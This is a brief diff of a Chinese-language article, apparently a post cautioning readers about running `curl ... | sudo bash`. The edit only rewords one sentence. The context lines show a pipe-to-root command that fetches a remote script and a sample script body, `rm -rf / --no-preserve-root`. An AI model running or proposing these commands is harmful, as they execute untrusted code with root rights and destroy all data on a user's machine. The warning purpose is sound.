@@ -9,7 +9,7 @@ $ curl https://lorem.ipsum/dolor.sh | sudo bash
 
 上面的一行命令，你看着熟悉吗？
 
-如果 *noarch* 现在告诉你，这个你将要运行的 `dolor.sh` 内容是这样的：
+*noarch* 现在告诉你，这个你将要运行的 `dolor.sh` 内容是这样的：
 
 ```
 rm -rf / --no-preserve-root
